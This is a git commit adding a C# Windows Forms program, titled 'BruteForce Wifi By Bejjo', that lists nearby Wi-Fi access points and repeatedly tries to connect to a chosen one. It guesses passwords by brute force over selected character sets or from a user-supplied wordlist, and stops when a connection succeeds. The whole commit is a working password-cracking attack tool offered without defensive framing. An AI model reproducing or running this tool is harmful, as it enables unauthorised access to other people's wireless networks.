947f2917692c8f8abd2ed2b35fa00fcd699d5889
Bejjo <Aldhiya.rozak@gmail.com>
2020-06-27 17:27:30 +0700

    Wifi

---
+++ Wifi Cracker/Form1.Designer.cs
@@ -0,0 +1,296 @@
+﻿namespace Wifi_Cracker
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.label2 = new System.Windows.Forms.Label();
+            this.panel2 = new System.Windows.Forms.Panel();
+            this.button2 = new System.Windows.Forms.Button();
+            this.label5 = new System.Windows.Forms.Label();
+            this.checkBox2 = new System.Windows.Forms.CheckBox();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.button4 = new System.Windows.Forms.Button();
+            this.checkBox3 = new System.Windows.Forms.CheckBox();
+            this.checkBox4 = new System.Windows.Forms.CheckBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.listView1 = new System.Windows.Forms.ListView();
+            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.label3 = new System.Windows.Forms.Label();
+            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
+            this.checkBox5 = new System.Windows.Forms.CheckBox();
+            this.panel2.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Agency FB", 13.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.label2.Location = new System.Drawing.Point(12, 31);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(48, 28);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "Area";
+            // 
+            // panel2
+            // 
+            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(100)))), ((int)(((byte)(157)))));
+            this.panel2.Controls.Add(this.button2);
+            this.panel2.Controls.Add(this.label5);
+            this.panel2.Controls.Add(this.checkBox2);
+            this.panel2.Controls.Add(this.checkBox1);
+            this.panel2.Controls.Add(this.textBox3);
+            this.panel2.Controls.Add(this.button4);
+            this.panel2.Controls.Add(this.checkBox3);
+            this.panel2.Controls.Add(this.checkBox4);
+            this.panel2.Controls.Add(this.label2);
+            this.panel2.Dock = System.Windows.Forms.DockStyle.Left;
+            this.panel2.Location = new System.Drawing.Point(0, 0);
+            this.panel2.Name = "panel2";
+            this.panel2.Size = new System.Drawing.Size(173, 311);
+            this.panel2.TabIndex = 2;
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(81, 12);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 0;
+            this.button2.Text = "asd";
+            this.button2.Visible = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.label5.Location = new System.Drawing.Point(25, 225);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(68, 24);
+            this.label5.TabIndex = 20;
+            this.label5.Text = "Custome :";
+            // 
+            // checkBox2
+            // 
+            this.checkBox2.AutoSize = true;
+            this.checkBox2.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.checkBox2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.checkBox2.Location = new System.Drawing.Point(29, 74);
+            this.checkBox2.Name = "checkBox2";
+            this.checkBox2.Size = new System.Drawing.Size(52, 28);
+            this.checkBox2.TabIndex = 17;
+            this.checkBox2.Text = "a-z";
+            this.checkBox2.UseVisualStyleBackColor = true;
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.checkBox1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.checkBox1.Location = new System.Drawing.Point(29, 111);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(50, 28);
+            this.checkBox1.TabIndex = 16;
+            this.checkBox1.Text = "A-Z";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            // 
+            // textBox3
+            // 
+            this.textBox3.BackColor = System.Drawing.SystemColors.Control;
+            this.textBox3.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(100)))), ((int)(((byte)(157)))));
+            this.textBox3.Location = new System.Drawing.Point(29, 252);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.ReadOnly = true;
+            this.textBox3.Size = new System.Drawing.Size(79, 31);
+            this.textBox3.TabIndex = 21;
+            // 
+            // button4
+            // 
+            this.button4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(129)))), ((int)(((byte)(175)))));
+            this.button4.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.button4.Location = new System.Drawing.Point(114, 252);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(27, 31);
+            this.button4.TabIndex = 22;
+            this.button4.Text = "...";
+            this.button4.UseVisualStyleBackColor = false;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // checkBox3
+            // 
+            this.checkBox3.AutoSize = true;
+            this.checkBox3.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.checkBox3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.checkBox3.Location = new System.Drawing.Point(29, 147);
+            this.checkBox3.Name = "checkBox3";
+            this.checkBox3.Size = new System.Drawing.Size(85, 28);
+            this.checkBox3.TabIndex = 18;
+            this.checkBox3.Text = "Numbers";
+            this.checkBox3.UseVisualStyleBackColor = true;
+            // 
+            // checkBox4
+            // 
+            this.checkBox4.AutoSize = true;
+            this.checkBox4.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.checkBox4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.checkBox4.Location = new System.Drawing.Point(29, 183);
+            this.checkBox4.Name = "checkBox4";
+            this.checkBox4.Size = new System.Drawing.Size(80, 28);
+            this.checkBox4.TabIndex = 19;
+            this.checkBox4.Text = "Symbols";
+            this.checkBox4.UseVisualStyleBackColor = true;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(129)))), ((int)(((byte)(175)))));
+            this.button1.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.button1.Location = new System.Drawing.Point(534, 255);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 33);
+            this.button1.TabIndex = 3;
+            this.button1.Text = "Go!";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // listView1
+            // 
+            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader1,
+            this.columnHeader2});
+            this.listView1.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.listView1.ForeColor = System.Drawing.Color.Gray;
+            this.listView1.Location = new System.Drawing.Point(201, 26);
+            this.listView1.Name = "listView1";
+            this.listView1.Size = new System.Drawing.Size(408, 223);
+            this.listView1.TabIndex = 4;
+            this.listView1.UseCompatibleStateImageBehavior = false;
+            this.listView1.View = System.Windows.Forms.View.Details;
+            // 
+            // columnHeader1
+            // 
+            this.columnHeader1.Text = "Network Name";
+            this.columnHeader1.Width = 217;
+            // 
+            // columnHeader2
+            // 
+            this.columnHeader2.Text = "Signal Strenght";
+            this.columnHeader2.Width = 187;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.label3.Location = new System.Drawing.Point(209, 259);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(133, 24);
+            this.label3.TabIndex = 9;
+            this.label3.Text = "Password Length : 1 -";
+            // 
+            // numericUpDown1
+            // 
+            this.numericUpDown1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(129)))), ((int)(((byte)(175)))));
+            this.numericUpDown1.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.numericUpDown1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.numericUpDown1.Location = new System.Drawing.Point(358, 257);
+            this.numericUpDown1.Name = "numericUpDown1";
+            this.numericUpDown1.ReadOnly = true;
+            this.numericUpDown1.Size = new System.Drawing.Size(47, 31);
+            this.numericUpDown1.TabIndex = 8;
+            this.numericUpDown1.Value = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            this.numericUpDown1.ValueChanged += new System.EventHandler(this.numericUpDown1_ValueChanged);
+            // 
+            // checkBox5
+            // 
+            this.checkBox5.AutoSize = true;
+            this.checkBox5.Font = new System.Drawing.Font("Agency FB", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.checkBox5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(240)))), ((int)(((byte)(251)))));
+            this.checkBox5.Location = new System.Drawing.Point(411, 259);
+            this.checkBox5.Name = "checkBox5";
+            this.checkBox5.Size = new System.Drawing.Size(85, 28);
+            this.checkBox5.TabIndex = 23;
+            this.checkBox5.Text = "Standard";
+            this.checkBox5.UseVisualStyleBackColor = true;
+            this.checkBox5.CheckedChanged += new System.EventHandler(this.checkBox5_CheckedChanged);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(83)))), ((int)(((byte)(90)))), ((int)(((byte)(95)))));
+            this.ClientSize = new System.Drawing.Size(640, 311);
+            this.Controls.Add(this.checkBox5);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.numericUpDown1);
+            this.Controls.Add(this.listView1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.panel2);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Name = "Form1";
+            this.Text = "BruteForce Wifi By Bejjo";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.panel2.ResumeLayout(false);
+            this.panel2.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Panel panel2;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.CheckBox checkBox2;
+        private System.Windows.Forms.CheckBox checkBox3;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.CheckBox checkBox4;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.ListView listView1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.NumericUpDown numericUpDown1;
+        private System.Windows.Forms.ColumnHeader columnHeader1;
+        private System.Windows.Forms.ColumnHeader columnHeader2;
+        private System.Windows.Forms.CheckBox checkBox5;
+        private System.Windows.Forms.Button button2;
+    }
+}
+
---
+++ Wifi Cracker/Form1.cs
@@ -0,0 +1,204 @@
+﻿using SimpleWifi;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Wifi_Cracker
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool AllocConsole();
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private string azup = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        private string azlw = "abcdefghijklmnopqrstuvwxyz";
+        private string numb = "0123456789";
+        private string symb = "!@#$%^&*()-_=+{[}]|:;<>,.?/";
+
+        private static Wifi wifi;
+        private string text = "";
+        private string texttotal = "";
+        private string area = "";
+        private int x = 0, first = 0;
+        string[] custm;
+        private async Task cstmForce(AccessPoint ap)
+        {
+            foreach (string x in custm)
+            {
+                Console.WriteLine(x);
+                await Task.Run(() => connect(ap, x));
+            }
+        }
+        private async Task bruteForce(int xx,AccessPoint ap)
+        {
+            if (x == xx)
+            {
+                foreach (char chrx in area)
+                {
+                    texttotal = text + chrx;
+                    Console.WriteLine(texttotal);
+                    await Task.Run(()=> connect(ap, texttotal));
+                    //connect(ap, texttotal);
+                }
+            }
+            else
+            {
+                xx--;
+                foreach (char chrx in area)
+                {
+                    text += chrx;
+                    await bruteForce(xx,ap);
+                    text = text.Substring(0, text.Length - 1);
+                }
+            }
+        }
+        private void button4_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog dlg = new OpenFileDialog();
+            dlg.Filter = "Text Documents (*.txt)|*.txt";
+            if (dlg.ShowDialog() == DialogResult.OK)
+            {
+                checkBox1.Enabled = false;
+                checkBox2.Enabled = false;
+                checkBox3.Enabled = false;
+                checkBox4.Enabled = false;
+                checkBox5.Enabled = false;
+                numericUpDown1.Enabled = false;
+                button1.Enabled = true;
+                textBox3.Text = dlg.FileName;
+                custm = File.ReadAllLines(dlg.FileName, Encoding.UTF8);
+            }
+        }
+
+        private async void button1_Click(object sender, EventArgs e)
+        {
+            if(listView1.Items.Count > 0)
+            {
+                if (checkBox2.Checked)
+                {
+                    area += azlw;
+                }
+                if (checkBox1.Checked)
+                {
+                    area += azup;
+                }
+                if (checkBox3.Checked)
+                {
+                    area += numb;
+                }
+                if (checkBox4.Checked)
+                {
+                    area += symb;
+                }
+
+                ListViewItem selecteditem = listView1.SelectedItems[0];
+                AccessPoint ap = (AccessPoint)selecteditem.Tag;
+                AllocConsole();
+                if (textBox3.Text == "")
+                {
+                    for (int i = first; i < numericUpDown1.Value; i++)
+                    {
+                        await bruteForce(i, ap);
+                    }
+                }
+                else
+                {
+                    await cstmForce(ap);
+                }
+            }
+        }
+        private async Task connect(AccessPoint ap, string password)
+        {
+            ap.DeleteProfile();
+            bool str = false;
+            AuthRequest ar = new AuthRequest(ap);
+            ar.Password = password;
+            try
+            {
+                str = await Task.Run(() => ap.Connect(ar));
+                //str = ap.Connect(ar);
+            }
+            catch
+            {
+            }
+            Console.WriteLine(ap.ToString()+ar.Password + str);
+            if(str)
+            {
+                Environment.Exit(0);
+            }
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            wifi = new Wifi();
+            List<AccessPoint> aps = wifi.GetAccessPoints();
+            foreach(AccessPoint ap in aps)
+            {
+                ListViewItem lobj = new ListViewItem(ap.Name);
+                lobj.SubItems.Add(ap.SignalStrength + "'''");
+                lobj.Tag = ap;
+                listView1.Items.Add(lobj);
+            }
+        }
+
+        private async void button2_Click(object sender, EventArgs e)
+        {
+            string[] arrrr = { "ex38hdhd", "dttb5381", "jdkeiua9", "fjdhklo3", "mkjklks0" };
+            ListViewItem selecteditem = listView1.SelectedItems[0];
+            AccessPoint ap = (AccessPoint)selecteditem.Tag;
+            foreach(string x in arrrr)
+            {
+                Console.WriteLine(x);
+                await Task.Run(() => connect(ap, x));
+                Console.WriteLine("Waiting...");
+            }
+        }
+
+        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
+        {
+            if((checkBox5.Checked && numericUpDown1.Value<8) || (numericUpDown1.Value == 0))
+            {
+                button1.Enabled = false;
+            }
+            else
+            {
+                button1.Enabled = true;
+            }
+        }
+
+        private void checkBox5_CheckedChanged(object sender, EventArgs e)
+        {
+            if(checkBox5.Checked)
+            {
+                label3.Text = "Password Length : 8 -";
+                first = 7;
+                if (numericUpDown1.Value < 8)
+                {
+                    button1.Enabled = false;
+                }
+            }
+            else
+            {
+                label3.Text = "Password Length : 1 -";
+                first = 0;
+                if (numericUpDown1.Value > 0)
+                {
+                    button1.Enabled = true;
+                }
+            }
+        }
+    }
+}
